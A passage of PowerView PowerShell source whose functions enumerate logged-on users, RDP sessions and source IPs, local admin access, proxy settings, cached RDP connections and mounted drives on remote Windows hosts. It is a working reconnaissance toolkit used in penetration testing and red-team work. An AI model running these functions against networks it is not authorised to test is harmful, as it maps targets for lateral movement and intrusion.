                    $Info = $NewIntPtr -as $SESSION_INFO_10

                    # return all the sections of the structure - have to do it this way for V2
                    $Session = $Info | Select-Object *
                    $Session | Add-Member Noteproperty 'ComputerName' $Computer
                    $Session.PSObject.TypeNames.Insert(0, 'PowerView.SessionInfo')
                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment
                    $Session
                }

                # free up the result buffer
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose "[Get-NetSession] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
    }


    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-RegLoggedOn {
<#
.SYNOPSIS

Returns who is logged onto the local (or a remote) machine
through enumeration of remote registry keys.

Note: This function requires only domain user rights on the
machine you're enumerating, but remote registry must be enabled.

Author: Matt Kelly (@BreakersAll)  
License: BSD 3-Clause  
Required Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf, ConvertFrom-SID  

.DESCRIPTION

This function will query the HKU registry values to retrieve the local
logged on users SID and then attempt and reverse it.
Adapted technique from Sysinternal's PSLoggedOn script. Benefit over
using the NetWkstaUserEnum API (Get-NetLoggedon) of less user privileges
required (NetWkstaUserEnum requires remote admin access).

.PARAMETER ComputerName

Specifies the hostname to query for remote registry values (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Get-RegLoggedOn

Returns users actively logged onto the local host.

.EXAMPLE

Get-RegLoggedOn -ComputerName sqlserver

Returns users actively logged onto the 'sqlserver' host.

.EXAMPLE

Get-DomainController | Get-RegLoggedOn

Returns users actively logged on all domain controllers.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-RegLoggedOn -ComputerName sqlserver -Credential $Cred

.OUTPUTS

PowerView.RegLoggedOnUser

A PSCustomObject including the UserDomain/UserName/UserSID of each
actively logged on user, with the ComputerName added.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.RegLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost'
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                # retrieve HKU remote registry values
                $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', "$ComputerName")

                # sort out bogus sid's like _class
                $Reg.GetSubKeyNames() | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' } | ForEach-Object {
                    $UserName = ConvertFrom-SID -ObjectSID $_ -OutputType 'DomainSimple'

                    if ($UserName) {
                        $UserName, $UserDomain = $UserName.Split('@')
                    }
                    else {
                        $UserName = $_
                        $UserDomain = $Null
                    }

                    $RegLoggedOnUser = New-Object PSObject
                    $RegLoggedOnUser | Add-Member Noteproperty 'ComputerName' "$ComputerName"
                    $RegLoggedOnUser | Add-Member Noteproperty 'UserDomain' $UserDomain
                    $RegLoggedOnUser | Add-Member Noteproperty 'UserName' $UserName
                    $RegLoggedOnUser | Add-Member Noteproperty 'UserSID' $_
                    $RegLoggedOnUser.PSObject.TypeNames.Insert(0, 'PowerView.RegLoggedOnUser')
                    $RegLoggedOnUser
                }
            }
            catch {
                Write-Verbose "[Get-RegLoggedOn] Error opening remote registry on '$ComputerName' : $_"
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetRDPSession {
<#
.SYNOPSIS

Returns remote desktop/session information for the local (or a remote) machine.

Note: only members of the Administrators or Account Operators local group
can successfully execute this functionality on a remote target.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will execute the WTSEnumerateSessionsEx and WTSQuerySessionInformation
Win32API calls to query a given RDP remote service for active sessions and originating
IPs. This is a replacement for qwinsta.

.PARAMETER ComputerName

Specifies the hostname to query for active sessions (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Get-NetRDPSession

Returns active RDP/terminal sessions on the local host.

.EXAMPLE

Get-NetRDPSession -ComputerName "sqlserver"

Returns active RDP/terminal sessions on the 'sqlserver' host.

.EXAMPLE

Get-DomainController | Get-NetRDPSession

Returns active RDP/terminal sessions on all domain controllers.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-NetRDPSession -ComputerName sqlserver -Credential $Cred

.OUTPUTS

PowerView.RDPSessionInfo

A PSCustomObject representing a combined WTS_SESSION_INFO_1 and WTS_CLIENT_ADDRESS structure,
with the ComputerName added.

.LINK

https://msdn.microsoft.com/en-us/library/aa383861(v=vs.85).aspx
#>

    [OutputType('PowerView.RDPSessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {

            # open up a handle to the Remote Desktop Session host
            $Handle = $Wtsapi32::WTSOpenServerEx($Computer)

            # if we get a non-zero handle back, everything was successful
            if ($Handle -ne 0) {

                # arguments for WTSEnumerateSessionsEx
                $ppSessionInfo = [IntPtr]::Zero
                $pCount = 0

                # get information on all current sessions
                $Result = $Wtsapi32::WTSEnumerateSessionsEx($Handle, [ref]1, 0, [ref]$ppSessionInfo, [ref]$pCount);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                # locate the offset of the initial intPtr
                $Offset = $ppSessionInfo.ToInt64()

                if (($Result -ne 0) -and ($Offset -gt 0)) {

                    # work out how much to increment the pointer by finding out the size of the structure
                    $Increment = $WTS_SESSION_INFO_1::GetSize()

                    # parse all the result structures
                    for ($i = 0; ($i -lt $pCount); $i++) {

                        # create a new int ptr at the given offset and cast the pointer as our result structure
                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                        $Info = $NewIntPtr -as $WTS_SESSION_INFO_1

                        $RDPSession = New-Object PSObject

                        if ($Info.pHostName) {
                            $RDPSession | Add-Member Noteproperty 'ComputerName' $Info.pHostName
                        }
                        else {
                            # if no hostname returned, use the specified hostname
                            $RDPSession | Add-Member Noteproperty 'ComputerName' $Computer
                        }

                        $RDPSession | Add-Member Noteproperty 'SessionName' $Info.pSessionName

                        if ($(-not $Info.pDomainName) -or ($Info.pDomainName -eq '')) {
                            # if a domain isn't returned just use the username
                            $RDPSession | Add-Member Noteproperty 'UserName' "$($Info.pUserName)"
                        }
                        else {
                            $RDPSession | Add-Member Noteproperty 'UserName' "$($Info.pDomainName)\$($Info.pUserName)"
                        }

                        $RDPSession | Add-Member Noteproperty 'ID' $Info.SessionID
                        $RDPSession | Add-Member Noteproperty 'State' $Info.State

                        $ppBuffer = [IntPtr]::Zero
                        $pBytesReturned = 0

                        # query for the source client IP with WTSQuerySessionInformation
                        #   https://msdn.microsoft.com/en-us/library/aa383861(v=vs.85).aspx
                        $Result2 = $Wtsapi32::WTSQuerySessionInformation($Handle, $Info.SessionID, 14, [ref]$ppBuffer, [ref]$pBytesReturned);$LastError2 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if ($Result2 -eq 0) {
                            Write-Verbose "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError2).Message)"
                        }
                        else {
                            $Offset2 = $ppBuffer.ToInt64()
                            $NewIntPtr2 = New-Object System.Intptr -ArgumentList $Offset2
                            $Info2 = $NewIntPtr2 -as $WTS_CLIENT_ADDRESS

                            $SourceIP = $Info2.Address
                            if ($SourceIP[2] -ne 0) {
                                $SourceIP = [String]$SourceIP[2]+'.'+[String]$SourceIP[3]+'.'+[String]$SourceIP[4]+'.'+[String]$SourceIP[5]
                            }
                            else {
                                $SourceIP = $Null
                            }

                            $RDPSession | Add-Member Noteproperty 'SourceIP' $SourceIP
                            $RDPSession.PSObject.TypeNames.Insert(0, 'PowerView.RDPSessionInfo')
                            $RDPSession

                            # free up the memory buffer
                            $Null = $Wtsapi32::WTSFreeMemory($ppBuffer)

                            $Offset += $Increment
                        }
                    }
                    # free up the memory result buffer
                    $Null = $Wtsapi32::WTSFreeMemoryEx(2, $ppSessionInfo, $pCount)
                }
                else {
                    Write-Verbose "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                }
                # close off the service handle
                $Null = $Wtsapi32::WTSCloseServer($Handle)
            }
            else {
                Write-Verbose "[Get-NetRDPSession] Error opening the Remote Desktop Session Host (RD Session Host) server for: $ComputerName"
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Test-AdminAccess {
<#
.SYNOPSIS

Tests if the current user has administrative access to the local (or a remote) machine.

Idea stolen from the local_admin_search_enum post module in Metasploit written by:  
    'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'  
    'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>'  
    'Royce Davis "r3dy" <rdavis[at]accuvant.com>'  

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will use the OpenSCManagerW Win32API call to establish
a handle to the remote host. If this succeeds, the current user context
has local administrator acess to the target.

.PARAMETER ComputerName

Specifies the hostname to check for local admin access (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Test-AdminAccess -ComputerName sqlserver

Returns results indicating whether the current user has admin access to the 'sqlserver' host.

.EXAMPLE

Get-DomainComputer | Test-AdminAccess

Returns what machines in the domain the current user has access to.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Test-AdminAccess -ComputerName sqlserver -Credential $Cred

.OUTPUTS

PowerView.AdminAccess

A PSCustomObject containing the ComputerName and 'IsAdmin' set to whether
the current user has local admin rights, along with the ComputerName added.

.LINK

https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/local_admin_search_enum.rb
http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
#>

    [OutputType('PowerView.AdminAccess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # 0xF003F - SC_MANAGER_ALL_ACCESS
            #   http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx
            $Handle = $Advapi32::OpenSCManagerW("\\$Computer", 'ServicesActive', 0xF003F);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            $IsAdmin = New-Object PSObject
            $IsAdmin | Add-Member Noteproperty 'ComputerName' $Computer

            # if we get a non-zero handle back, everything was successful
            if ($Handle -ne 0) {
                $Null = $Advapi32::CloseServiceHandle($Handle)
                $IsAdmin | Add-Member Noteproperty 'IsAdmin' $True
            }
            else {
                Write-Verbose "[Test-AdminAccess] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                $IsAdmin | Add-Member Noteproperty 'IsAdmin' $False
            }
            $IsAdmin.PSObject.TypeNames.Insert(0, 'PowerView.AdminAccess')
            $IsAdmin
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetComputerSiteName {
<#
.SYNOPSIS

Returns the AD site where the local (or a remote) machine resides.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will use the DsGetSiteName Win32API call to look up the
name of the site where a specified computer resides.

.PARAMETER ComputerName

Specifies the hostname to check the site for (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Get-NetComputerSiteName -ComputerName WINDOWS1.testlab.local

Returns the site for WINDOWS1.testlab.local.

.EXAMPLE

Get-DomainComputer | Get-NetComputerSiteName

Returns the sites for every machine in AD.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-NetComputerSiteName -ComputerName WINDOWS1.testlab.local -Credential $Cred

.OUTPUTS

PowerView.ComputerSite

A PSCustomObject containing the ComputerName, IPAddress, and associated Site name.
#>

    [OutputType('PowerView.ComputerSite')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # if we get an IP address, try to resolve the IP to a hostname
            if ($Computer -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
                $IPAddress = $Computer
                $Computer = [System.Net.Dns]::GetHostByAddress($Computer) | Select-Object -ExpandProperty HostName
            }
            else {
                $IPAddress = @(Resolve-IPAddress -ComputerName $Computer)[0].IPAddress
            }

            $PtrInfo = [IntPtr]::Zero

            $Result = $Netapi32::DsGetSiteName($Computer, [ref]$PtrInfo)

            $ComputerSite = New-Object PSObject
            $ComputerSite | Add-Member Noteproperty 'ComputerName' $Computer
            $ComputerSite | Add-Member Noteproperty 'IPAddress' $IPAddress

            if ($Result -eq 0) {
                $Sitename = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($PtrInfo)
                $ComputerSite | Add-Member Noteproperty 'SiteName' $Sitename
            }
            else {
                Write-Verbose "[Get-NetComputerSiteName] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                $ComputerSite | Add-Member Noteproperty 'SiteName' ''
            }
            $ComputerSite.PSObject.TypeNames.Insert(0, 'PowerView.ComputerSite')

            # free up the result buffer
            $Null = $Netapi32::NetApiBufferFree($PtrInfo)

            $ComputerSite
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-WMIRegProxy {
<#
.SYNOPSIS

Enumerates the proxy server and WPAD conents for the current user.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Enumerates the proxy server and WPAD specification for the current user
on the local machine (default), or a machine specified with -ComputerName.
It does this by enumerating settings from
HKU:SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings.

.PARAMETER ComputerName

Specifies the system to enumerate proxy settings on. Defaults to the local host.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connecting to the remote system.

.EXAMPLE

Get-WMIRegProxy

ComputerName           ProxyServer            AutoConfigURL         Wpad
------------           -----------            -------------         ----
WINDOWS1               http://primary.test...

.EXAMPLE

$Cred = Get-Credential "TESTLAB\administrator"
Get-WMIRegProxy -Credential $Cred -ComputerName primary.testlab.local

ComputerName            ProxyServer            AutoConfigURL         Wpad
------------            -----------            -------------         ----
windows1.testlab.local  primary.testlab.local

.INPUTS

String

Accepts one or more computer name specification strings  on the pipeline (netbios or FQDN).

.OUTPUTS

PowerView.ProxySettings

Outputs custom PSObjects with the ComputerName, ProxyServer, AutoConfigURL, and WPAD contents.
#>

    [OutputType('PowerView.ProxySettings')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                $WmiArguments = @{
                    'List' = $True
                    'Class' = 'StdRegProv'
                    'Namespace' = 'root\default'
                    'Computername' = $Computer
                    'ErrorAction' = 'Stop'
                }
                if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }

                $RegProvider = Get-WmiObject @WmiArguments
                $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings'

                # HKEY_CURRENT_USER
                $HKCU = 2147483649
                $ProxyServer = $RegProvider.GetStringValue($HKCU, $Key, 'ProxyServer').sValue
                $AutoConfigURL = $RegProvider.GetStringValue($HKCU, $Key, 'AutoConfigURL').sValue

                $Wpad = ''
                if ($AutoConfigURL -and ($AutoConfigURL -ne '')) {
                    try {
                        $Wpad = (New-Object Net.WebClient).DownloadString($AutoConfigURL)
                    }
                    catch {
                        Write-Warning "[Get-WMIRegProxy] Error connecting to AutoConfigURL : $AutoConfigURL"
                    }
                }

                if ($ProxyServer -or $AutoConfigUrl) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'ComputerName' $Computer
                    $Out | Add-Member Noteproperty 'ProxyServer' $ProxyServer
                    $Out | Add-Member Noteproperty 'AutoConfigURL' $AutoConfigURL
                    $Out | Add-Member Noteproperty 'Wpad' $Wpad
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.ProxySettings')
                    $Out
                }
                else {
                    Write-Warning "[Get-WMIRegProxy] No proxy settings found for $ComputerName"
                }
            }
            catch {
                Write-Warning "[Get-WMIRegProxy] Error enumerating proxy settings for $ComputerName : $_"
            }
        }
    }
}


function Get-WMIRegLastLoggedOn {
<#
.SYNOPSIS

Returns the last user who logged onto the local (or a remote) machine.

Note: This function requires administrative rights on the machine you're enumerating.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

This function uses remote registry to enumerate the LastLoggedOnUser registry key
for the local (or remote) machine.

.PARAMETER ComputerName

Specifies the hostname to query for remote registry values (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connecting to the remote system.

.EXAMPLE

Get-WMIRegLastLoggedOn

Returns the last user logged onto the local machine.

.EXAMPLE

Get-WMIRegLastLoggedOn -ComputerName WINDOWS1

Returns the last user logged onto WINDOWS1

.EXAMPLE

Get-DomainComputer | Get-WMIRegLastLoggedOn

Returns the last user logged onto all machines in the domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-WMIRegLastLoggedOn -ComputerName PRIMARY.testlab.local -Credential $Cred

.OUTPUTS

PowerView.LastLoggedOnUser

A PSCustomObject containing the ComputerName and last loggedon user.
#>

    [OutputType('PowerView.LastLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # HKEY_LOCAL_MACHINE
            $HKLM = 2147483650

            $WmiArguments = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $Computer
                'ErrorAction' = 'SilentlyContinue'
            }
            if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }

            # try to open up the remote registry key to grab the last logged on user
            try {
                $Reg = Get-WmiObject @WmiArguments

                $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI'
                $Value = 'LastLoggedOnUser'
                $LastUser = $Reg.GetStringValue($HKLM, $Key, $Value).sValue

                $LastLoggedOn = New-Object PSObject
                $LastLoggedOn | Add-Member Noteproperty 'ComputerName' $Computer
                $LastLoggedOn | Add-Member Noteproperty 'LastLoggedOn' $LastUser
                $LastLoggedOn.PSObject.TypeNames.Insert(0, 'PowerView.LastLoggedOnUser')
                $LastLoggedOn
            }
            catch {
                Write-Warning "[Get-WMIRegLastLoggedOn] Error opening remote registry on $Computer. Remote registry likely not enabled."
            }
        }
    }
}


function Get-WMIRegCachedRDPConnection {
<#
.SYNOPSIS

Returns information about RDP connections outgoing from the local (or remote) machine.

Note: This function requires administrative rights on the machine you're enumerating.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: ConvertFrom-SID  

.DESCRIPTION

Uses remote registry functionality to query all entries for the
"Windows Remote Desktop Connection Client" on a machine, separated by
user and target server.

.PARAMETER ComputerName

Specifies the hostname to query for cached RDP connections (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connecting to the remote system.

.EXAMPLE

Get-WMIRegCachedRDPConnection

Returns the RDP connection client information for the local machine.

.EXAMPLE

Get-WMIRegCachedRDPConnection  -ComputerName WINDOWS2.testlab.local

Returns the RDP connection client information for the WINDOWS2.testlab.local machine

.EXAMPLE

Get-DomainComputer | Get-WMIRegCachedRDPConnection

Returns cached RDP information for all machines in the domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-WMIRegCachedRDPConnection -ComputerName PRIMARY.testlab.local -Credential $Cred

.OUTPUTS

PowerView.CachedRDPConnection

A PSCustomObject containing the ComputerName and cached RDP information.
#>

    [OutputType('PowerView.CachedRDPConnection')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # HKEY_USERS
            $HKU = 2147483651

            $WmiArguments = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $Computer
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }

            try {
                $Reg = Get-WmiObject @WmiArguments

                # extract out the SIDs of domain users in this hive
                $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

                ForEach ($UserSID in $UserSIDs) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID -Credential $Credential
                        }
                        else {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID
                        }

                        # pull out all the cached RDP connections
                        $ConnectionKeys = $Reg.EnumValues($HKU,"$UserSID\Software\Microsoft\Terminal Server Client\Default").sNames

                        ForEach ($Connection in $ConnectionKeys) {
                            # make sure this key is a cached connection
                            if ($Connection -match 'MRU.*') {
                                $TargetServer = $Reg.GetStringValue($HKU, "$UserSID\Software\Microsoft\Terminal Server Client\Default", $Connection).sValue

                                $FoundConnection = New-Object PSObject
                                $FoundConnection | Add-Member Noteproperty 'ComputerName' $Computer
                                $FoundConnection | Add-Member Noteproperty 'UserName' $UserName
                                $FoundConnection | Add-Member Noteproperty 'UserSID' $UserSID
                                $FoundConnection | Add-Member Noteproperty 'TargetServer' $TargetServer
                                $FoundConnection | Add-Member Noteproperty 'UsernameHint' $Null
                                $FoundConnection.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                                $FoundConnection
                            }
                        }

                        # pull out all the cached server info with username hints
                        $ServerKeys = $Reg.EnumKey($HKU,"$UserSID\Software\Microsoft\Terminal Server Client\Servers").sNames

                        ForEach ($Server in $ServerKeys) {

                            $UsernameHint = $Reg.GetStringValue($HKU, "$UserSID\Software\Microsoft\Terminal Server Client\Servers\$Server", 'UsernameHint').sValue

                            $FoundConnection = New-Object PSObject
                            $FoundConnection | Add-Member Noteproperty 'ComputerName' $Computer
                            $FoundConnection | Add-Member Noteproperty 'UserName' $UserName
                            $FoundConnection | Add-Member Noteproperty 'UserSID' $UserSID
                            $FoundConnection | Add-Member Noteproperty 'TargetServer' $Server
                            $FoundConnection | Add-Member Noteproperty 'UsernameHint' $UsernameHint
                            $FoundConnection.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                            $FoundConnection
                        }
                    }
                    catch {
                        Write-Verbose "[Get-WMIRegCachedRDPConnection] Error: $_"
                    }
                }
            }
            catch {
                Write-Warning "[Get-WMIRegCachedRDPConnection] Error accessing $Computer, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}


function Get-WMIRegMountedDrive {
<#
.SYNOPSIS

Returns information about saved network mounted drives for the local (or remote) machine.

Note: This function requires administrative rights on the machine you're enumerating.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: ConvertFrom-SID  

.DESCRIPTION

Uses remote registry functionality to enumerate recently mounted network drives.

.PARAMETER ComputerName

Specifies the hostname to query for mounted drive information (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connecting to the remote system.

.EXAMPLE

Get-WMIRegMountedDrive

Returns the saved network mounted drives for the local machine.

.EXAMPLE

Get-WMIRegMountedDrive -ComputerName WINDOWS2.testlab.local

Returns the saved network mounted drives for the WINDOWS2.testlab.local machine

.EXAMPLE

Get-DomainComputer | Get-WMIRegMountedDrive

Returns the saved network mounted drives for all machines in the domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-WMIRegMountedDrive -ComputerName PRIMARY.testlab.local -Credential $Cred

.OUTPUTS

PowerView.RegMountedDrive

A PSCustomObject containing the ComputerName and mounted drive information.
#>

    [OutputType('PowerView.RegMountedDrive')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # HKEY_USERS
            $HKU = 2147483651

            $WmiArguments = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $Computer
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }

            try {
                $Reg = Get-WmiObject @WmiArguments

                # extract out the SIDs of domain users in this hive
                $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

                ForEach ($UserSID in $UserSIDs) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID -Credential $Credential
                        }
                        else {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID
                        }

                        $DriveLetters = ($Reg.EnumKey($HKU, "$UserSID\Network")).sNames

                        ForEach ($DriveLetter in $DriveLetters) {
                            $ProviderName = $Reg.GetStringValue($HKU, "$UserSID\Network\$DriveLetter", 'ProviderName').sValue
                            $RemotePath = $Reg.GetStringValue($HKU, "$UserSID\Network\$DriveLetter", 'RemotePath').sValue
                            $DriveUserName = $Reg.GetStringValue($HKU, "$UserSID\Network\$DriveLetter", 'UserName').sValue
                            if (-not $UserName) { $UserName = '' }

                            if ($RemotePath -and ($RemotePath -ne '')) {
                                $MountedDrive = New-Object PSObject
